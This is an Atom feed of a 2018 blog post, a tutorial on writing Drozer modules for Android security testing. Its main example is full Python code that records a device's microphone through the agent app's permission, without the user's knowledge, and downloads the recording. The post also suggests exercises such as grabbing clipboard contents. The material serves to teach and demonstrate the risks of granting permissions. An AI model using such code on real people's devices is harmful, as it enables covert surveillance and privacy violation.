<?xml version="1.0" encoding="utf-8"?> 
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en-us">
    <generator uri="https://gohugo.io/" version="0.68.3">Hugo</generator><title type="html"><![CDATA[android on /dev/yash/notes]]></title>
    
        <subtitle type="html"><![CDATA[The directory of my thoughts]]></subtitle>
    
    
    
            <link href="https://yashagarwal.in/tags/android/" rel="alternate" type="text/html" title="HTML" />
            <link href="https://yashagarwal.in/tags/android/index.xml" rel="alternate" type="application/rss+xml" title="RSS" />
            <link href="https://yashagarwal.in/tags/android/atom.xml" rel="self" type="application/atom+xml" title="Atom" />
            <link href="https://yashagarwal.in/tags/android/jf2feed.json" rel="alternate" type="application/jf2feed+json" title="jf2feed" />
    <updated>2020-04-04T09:45:14+00:00</updated>
    
    
    <author>
            <name>Yash Agarwal</name>
            
                <email>yashagarwaljpr@gmail.com</email>
            </author>
    
        <id>https://yashagarwal.in/tags/android/</id>
    
        
        <entry>
            <title type="html"><![CDATA[Writing Drozer Modules]]></title>
            <link href="https://yashagarwal.in/posts/2018/05/writing-drozer-modules/?utm_source=atom_feed" rel="alternate" type="text/html" />
            
            
                <id>https://yashagarwal.in/posts/2018/05/writing-drozer-modules/</id>
            
            
                    <author>
                        <name>Yash Agarwal</name>
                    </author>
            <published>2018-05-13T17:10:13+05:30</published>
            <updated>2018-05-13T17:10:13+05:30</updated>
            
            
            <content type="html"><![CDATA[<p>This post is a result of my experimentation with Drozer. Drozer is a security testing framework for Android, developed by MWR Labs. According the Drozer&rsquo;s official <a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-drozer-user-guide-2015-03-23.pdf">documentation</a>:</p>
<blockquote>
<p>Drozer allows you to assume the role of an Android app and interact with other apps. It can do anything that an
installed application can do, such as making use of Android&rsquo;s Inter-Process Communication (IPC) mechanism and
interact with the underlying operating system.</p>
</blockquote>
<p>Drozer modules are written in Python. The module performs operations on an Android device with the help of an agent app installed on the device. The agent app, by default, has permission to use the internet connection only. This permission is required so that the agent can open a ServerSocket on port 31415 (default). The agent will listen for the incoming connections on this port. The console will connect to the agent on this port.</p>
<p>Drozer modules are inherited Python classes. The parent class is defined in <a href="https://github.com/mwrlabs/drozer/blob/develop/src/drozer/modules/base.py">drozer.modules.Module</a>. Drozer console provides commands to create a custom module repository, which is very useful for the local development of modules.</p>
<p>You can read more about the structure of a Drozer module <a href="https://github.com/mwrlabs/drozer/wiki/Writing-a-Module">here</a>.</p>
<p>I will explain all the critical parts of a Drozer module with the help of a sample module. I will be implementing a module to record and save the sound from the inbuilt mic of an Android device.</p>
<p>I initialized a new module repository using the Drozer console using the following command.</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">dz&gt; module repository create custom
Initialised repository at custom.</code></pre></div>
<p>You will see a new directory <code>custom</code> in your current directory after executing above command. Navigate to this directory and create a new folder with any name. I prefer to name this folder same as my module name. In this folder, create a file <code>__init__.py</code>. Drozer identifies the folder as a module directory if <code>__init__.py</code> is present in the directory. Now you can implement your module in this directory.</p>
<p>To begin implementing our module, create a new file <code>record.py</code> in the module directory. Drozer has many different utility classes, which we can use to simplify our implementation. To use these utility classes (<a href="https://github.com/mwrlabs/drozer/wiki/Using-mixins">mixins</a>), our module class must extend <em>mixins</em> using Python&rsquo;s multiple inheritance feature.</p>
<p>We first need to import all the required mixins. The mixins are stored in <code>modules.common</code> package in the Drozer source tree. After importing mixins and extending our class, the code will look like this. You can also import any other standard Python module here.</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">drozer.modules</span> <span class="kn">import</span> <span class="n">common</span><span class="p">,</span> <span class="n">Module</span>
<span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">subprocess</span><span class="o">,</span> <span class="nn">time</span>

<span class="k">class</span> <span class="nc">Record</span><span class="p">(</span><span class="n">Module</span><span class="p">,</span> <span class="n">common</span><span class="o">.</span><span class="n">Shell</span><span class="p">,</span> <span class="n">common</span><span class="o">.</span><span class="n">FileSystem</span><span class="p">,</span> <span class="n">common</span><span class="o">.</span><span class="n">ClassLoader</span><span class="p">):</span></code></pre></div>
<p>Now we will set up the metadata for our module. This information will help Drozer to organize and list our module correctly. We can define the name, description, author, date, license, path, permissions, and examples. Most of the available options are self-explanatory. But <em>path</em> and <em>permissions</em> require some explanation.</p>
<p>The <em>path</em> variable defined here is an array that contains the values for the namespace of the module. Drozer supports separate namespaces for each module. We can combine similar modules in the same namespace using this feature.</p>
<p>The <em>permissions</em> array variable contains all the permissions that this module will require for proper functioning. For example, our module will need permission to record audio on the device to work correctly. So we define this permission in the permissions array. The agent app on the device is required to have this permission. Otherwise, our module will throw an error.</p>
<p>The following snippet shows the metadata section of our module.</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">name</span> <span class="o">=</span> <span class="s2">&#34;Record sound from the inbuilt mic of an Android device.&#34;</span>
<span class="n">description</span> <span class="o">=</span> <span class="s2">&#34;Record sound from the inbuilt mic of an Android device. The default save format is 3GPP. Relies on the agent having the RECORD_AUDIO permission.&#34;</span>
<span class="n">examples</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
</span><span class="s2">dz&gt; run custom.record.record
</span><span class="s2">Setting up recorder configuration...
</span><span class="s2">Recording started
</span><span class="s2">Press any key to stop recording
</span><span class="s2">
</span><span class="s2">Recording stopped...downloading recording
</span><span class="s2">Screenshot captured. Saved at location /home/yash/work/drozer/1524201166.3gp
</span><span class="s2">&#34;&#34;&#34;</span>
<span class="n">author</span> <span class="o">=</span> <span class="s2">&#34;Yash Agarwal&#34;</span>
<span class="n">date</span> <span class="o">=</span> <span class="s2">&#34;2018-04-14&#34;</span>
<span class="n">license</span> <span class="o">=</span> <span class="s2">&#34;BSD (3 clause)&#34;</span>
<span class="n">path</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;custom&#34;</span><span class="p">,</span> <span class="s2">&#34;record&#34;</span><span class="p">]</span>
<span class="n">permissions</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;android.permission.RECORD_AUDIO&#34;</span><span class="p">,</span> <span class="s2">&#34;com.mwr.dz.permissions.GET_CONTEXT&#34;</span><span class="p">]</span></code></pre></div>
<p>Now we can start implementing the heart of our module, the <code>execute()</code> function. This function will be invoked by Drozer when the module is run. Every action that the module is expected to perform should be implemented in this method.</p>
<p>The implementation of <code>execute()</code> method is slightly tricky and requires an understanding of different classes and methods provided by the Android API. As we are writing a module to record sound, we will look into the documentation of <a href="https://developer.android.com/guide/topics/media/mediarecorder.html">MediaRecorder</a> class. Before reading further, go through the documentation about the use of reflection API in Drozer <a href="https://github.com/mwrlabs/drozer/wiki/Using-Reflection">here</a>.</p>
<p>The <code>execute()</code> function is given below.</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">execute</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">arguments</span><span class="p">):</span>
    <span class="c1"># unique file names</span>
    <span class="n">filename</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()))</span> <span class="o">+</span> <span class="s2">&#34;.3gp&#34;</span>

    <span class="c1"># current working directory of Drozer console</span>
    <span class="n">cwd</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">workingDir</span><span class="p">()</span>

    <span class="c1"># Magic of Reflection API !!!</span>
    <span class="n">recorder</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&#34;android.media.MediaRecorder&#34;</span><span class="p">)</span>
    <span class="n">AudioSource</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">klass</span><span class="p">(</span><span class="s2">&#34;android.media.MediaRecorder$AudioSource&#34;</span><span class="p">)</span>
    <span class="n">OutputFormat</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">klass</span><span class="p">(</span><span class="s2">&#34;android.media.MediaRecorder$OutputFormat&#34;</span><span class="p">)</span>
    <span class="n">AudioEncoder</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">klass</span><span class="p">(</span><span class="s2">&#34;android.media.MediaRecorder$AudioEncoder&#34;</span><span class="p">)</span>

    <span class="n">recorder</span><span class="o">.</span><span class="n">setAudioSource</span><span class="p">(</span><span class="n">AudioSource</span><span class="o">.</span><span class="n">MIC</span><span class="p">)</span>
    <span class="n">recorder</span><span class="o">.</span><span class="n">setOutputFormat</span><span class="p">(</span><span class="n">OutputFormat</span><span class="o">.</span><span class="n">THREE_GPP</span><span class="p">)</span>
    <span class="n">recorder</span><span class="o">.</span><span class="n">setAudioEncoder</span><span class="p">(</span><span class="n">AudioEncoder</span><span class="o">.</span><span class="n">AMR_NB</span><span class="p">)</span>
    <span class="n">recorder</span><span class="o">.</span><span class="n">setOutputFile</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%s</span><span class="s2">/recording.3gp&#34;</span> <span class="o">%</span> <span class="n">cwd</span><span class="p">)</span>
    <span class="n">recorder</span><span class="o">.</span><span class="n">prepare</span><span class="p">()</span>

    <span class="bp">self</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;Recording started</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="n">recorder</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
    <span class="nb">raw_input</span><span class="p">(</span><span class="s2">&#34;Press any key to stop recording</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="n">recorder</span><span class="o">.</span><span class="n">stop</span><span class="p">()</span>
    <span class="bp">self</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;Recording stopped...</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="n">recorder</span><span class="o">.</span><span class="n">reset</span><span class="p">()</span>
    <span class="n">recorder</span><span class="o">.</span><span class="n">release</span><span class="p">()</span>

    <span class="c1"># Download file from device to PC</span>
    <span class="n">length</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">downloadFile</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%s</span><span class="s2">/recording.3gp&#34;</span> <span class="o">%</span> <span class="n">cwd</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">length</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;Recording saved</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="k">else</span><span class="p">:</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">stderr</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;Recording could not be fetched from the device.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span></code></pre></div>
<p>I followed the sample use case given on <a href="https://developer.android.com/reference/android/media/MediaRecorder.html">this</a> page, to instantiate and use the <em>MediaRecorder</em> object.</p>
<p>After the recording is finished, we want to save this recorded media file to our computer. Drozer provides a method, <a href="https://github.com/mwrlabs/drozer/blob/c92d74024c653b6dc7de3378a24e51d276ae2c62/src/drozer/modules/common/file_system.py">downloadFile</a> exactly for this purpose. This method returns the length of the data downloaded on success and <code>None</code> otherwise. We can use this information to test the success or failure of the fetching of the recording.</p>
<p>That&rsquo;s all. We have successfully implemented a Drozer module which can record the sound on an Android device without the knowledge of the user. Do you smell something fishy here? The whole idea here depends on that particular <code>android.permission.RECORD_AUDIO</code> permission that our agent app had. It allowed our module to record without <em>user consent</em> (actually, the user gave her consent unknowingly while installing agent app). Many apps nowadays ask for arbitrarily random permissions. Those permissions might not be related to the functionality of the app in any way, but because there is no method to install apps without granting these permissions, the users grant all permissions to these apps. That can be exploited very easily. This tutorial tried to show one of such exploitations.</p>
<p>Here are some exercises that you should try if you want to learn more about Drozer module development.</p>
<ul>
<li>A module to initiate a call on a device.</li>
<li>A module to get the clipboard values on a device</li>
<li>Try finding a public exploit on Android forums such as XDA and implement that exploit as a Drozer module.</li>
</ul>
<p>Slightly tougher one.</p>
<ul>
<li>A module to terminate a call without user intervention (I do not know if it is possible to do this programmatically. If you implement this successfully, do let me know in the comments section.)</li>
</ul>
<p>Thanks for reading. Cheers :)</p>
]]></content>
            
                 
                    
                         
                        
                            
                             
                                <category scheme="https://yashagarwal.in/categories/technical" term="technical" label="Technical" />
                            
                        
                    
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://yashagarwal.in/tags/drozer" term="drozer" label="Drozer" />
                             
                                <category scheme="https://yashagarwal.in/tags/android" term="android" label="android" />
                            
                        
                    
                
            
        </entry>
    
</feed>
